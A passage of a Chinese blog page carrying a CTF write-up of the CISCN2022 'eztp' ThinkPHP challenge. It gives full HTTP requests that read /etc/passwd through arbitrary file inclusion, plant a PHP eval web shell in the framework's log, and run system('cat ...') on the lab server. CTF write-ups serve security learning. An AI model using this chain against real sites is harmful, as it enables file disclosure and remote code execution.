class="string">&#x27;&#x27;</span> == <span class="variable">$tag</span>) &#123;</span><br><span class="line">        <span class="variable">$name</span> .= <span class="string">&#x27;Behavior&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> \Think\<span class="title class_">Hook</span>::<span class="title function_ invoke__">exec</span>(<span class="variable">$name</span>, <span class="variable">$tag</span>, <span class="variable">$params</span>); <span class="comment"># 那么这个函数又是干什么的？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ThinkPHP\Library\Think\Hook.class.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hook</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行某个插件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name 插件名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $tag 方法名（标签名）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Mixed $params 传入的参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$tag</span>, &amp;<span class="variable">$params</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;Behavior&#x27;</span> == <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">8</span>)) &#123;</span><br><span class="line">            <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">            <span class="variable">$tag</span> = <span class="string">&#x27;run&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addon</span> = <span class="keyword">new</span> <span class="variable">$name</span>(); <span class="comment"># 实例化一个类 name 作为类名</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$addon</span>-&gt;<span class="variable">$tag</span>(<span class="variable">$params</span>); <span class="comment"># 调用一个方法并传参，tag 为方法名，params 为参数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的 name tag params 都是可控的，于是我们就可以实例化任意类并调用任意方法，恰好有这样一个类<br>ThinkPHP\Library\Think\Storage\Driver\File.class.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Storage</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $filename  文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $vars  传入变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$_filename</span>, <span class="variable">$vars</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_null</span>(<span class="variable">$vars</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">extract</span>(<span class="variable">$vars</span>, EXTR_OVERWRITE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_filename</span>; <span class="comment"># 任意文件包含</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>于是构造参数调用 Think\Storage\Driver\File-&gt;load 即可包含任意文件。  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=home/index/textBox</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>105</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.16.30.176:58002/?s=home/index/textBox</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">query<span class="built_in">=name</span><span class="meta">%253D</span><span class="meta">%255CThink</span><span class="meta">%255CStorage</span><span class="meta">%255CDriver</span><span class="meta">%255CFile</span><span class="meta">%2526id</span><span class="meta">%253D</span><span class="meta">%252Fetc</span><span class="meta">%252Fpasswd</span><span class="meta">%2526tag</span><span class="meta">%253Dload</span></span></span><br></pre></td></tr></table></figure>
+<p>成功包含 /etc/passwd，于是找一个可以包含的可控文本文件。通过观察可以发现这个框架是有日志文件的，而且会把 E 函数的报错信息写入日志文件，搜索一个可以触发 E 函数报错且信息可控的类方法<br>ThinkPHP\Library\Org\Net\Http.class.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Org</span>\<span class="title class_">Net</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Http</span></span></span><br><span class="line"><span class="class">    /**</span></span><br><span class="line"><span class="class">     * 下载文件</span></span><br><span class="line"><span class="class">     * 可以指定下载显示的文件名，并自动发送相应的<span class="title">Header</span>信息</span></span><br><span class="line"><span class="class">     * 如果指定了<span class="title">content</span>参数，则下载该参数的内容</span></span><br><span class="line"><span class="class">     * @<span class="title">static</span></span></span><br><span class="line"><span class="class">     * @<span class="title">access</span> <span class="title">public</span></span></span><br><span class="line"><span class="class">     * @<span class="title">param</span> <span class="title">string</span> $<span class="title">filename</span> 下载文件名</span></span><br><span class="line"><span class="class">     * @<span class="title">param</span> <span class="title">string</span> $<span class="title">showname</span> 下载显示的文件名</span></span><br><span class="line"><span class="class">     * @<span class="title">param</span> <span class="title">string</span> $<span class="title">content</span>  下载的内容</span></span><br><span class="line"><span class="class">     * @<span class="title">param</span> <span class="title">integer</span> $<span class="title">expire</span>  下载内容浏览器缓存时间</span></span><br><span class="line"><span class="class">     * @<span class="title">return</span> <span class="title">void</span></span></span><br><span class="line"><span class="class">     */</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">function</span> <span class="title">download</span>($<span class="title">filename</span>, $<span class="title">showname</span> = &#x27;&#x27;, $<span class="title">content</span> = &#x27;&#x27;, $<span class="title">expire</span> = 180)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_file</span>(UPLOAD_PATH . <span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$filename</span> = UPLOAD_PATH . <span class="variable">$filename</span>;</span><br><span class="line">            <span class="variable">$length</span>   = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$content</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">E</span>(<span class="variable">$filename</span> . <span class="title function_ invoke__">L</span>(<span class="string">&#x27;下载文件不存在！&#x27;</span>)); <span class="comment"># 这里把文件名赋成要写入日志的 php 代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$showname</span>)) &#123;</span><br><span class="line">            <span class="variable">$showname</span> = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>于是我们就可以 getshell 了，先触发报错将 shell 写入日志，再文件包含日志文件<br>写 shell  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=home/index/textBox</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>143</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.16.30.176:58002/?s=home/index/textBox</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">query<span class="built_in">=name</span><span class="meta">%253DOrg</span><span class="meta">%255CNet</span><span class="meta">%255CHttp</span><span class="meta">%2526id</span><span class="meta">%253D</span><span class="meta">%253C</span><span class="meta">%253Fphp</span><span class="meta">%2520</span><span class="meta">%2540eval</span>(<span class="meta">%2524_POST</span><span class="meta">%255Bpass</span><span class="meta">%255D</span>)<span class="meta">%253B</span><span class="meta">%2520</span><span class="meta">%253F</span><span class="meta">%253E</span><span class="meta">%2526tag</span><span class="meta">%253Ddownload</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure>
+<p>读 flag，这里的文件路径是先 ls 来的  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?s=home/index/textBox</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.16.30.176:58002</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.16.30.176:58002/?s=home/index/textBox</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-mel">query=name%253D%255CThink%255CStorage%255CDriver%255CFile%2526id%253D.%252FApplication%252FRuntime%252FLogs%252FHome%252F22_06_18.<span class="keyword">log</span>%2526tag%253Dload&amp;pass=<span class="keyword">system</span>(<span class="string">&#x27;cat /Secret_is_h3re&#x27;</span>);</span></span><br><span class="line"><span class="language-mel"></span></span><br></pre></td></tr></table></figure>
+
+<p>12 名止步分区赛，明年继续</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">初赛部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezpop"><span class="toc-number">1.1.</span> <span class="toc-text">Ezpop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#online-crt"><span class="toc-number">1.2.</span> <span class="toc-text">online_crt</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86"><span class="toc-number">2.</span> <span class="toc-text">分区赛部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Identity"><span class="toc-number">2.1.</span> <span class="toc-text">Identity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezser"><span class="toc-number">2.2.</span> <span class="toc-text">ezser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezssti"><span class="toc-number">2.3.</span> <span class="toc-text">ezssti</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eztp"><span class="toc-number">2.4.</span> <span class="toc-text">eztp</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/18/ciscn2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/18/ciscn2022/&text=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/18/ciscn2022/&is_video=false&description=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分&body=Check out this article: https://blog.477.moe/2022/06/18/ciscn2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/18/ciscn2022/&title=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/18/ciscn2022/&name=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/18/ciscn2022/&t=CTF Writeups - CISCN2022 初赛及分区赛 Web 部分"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
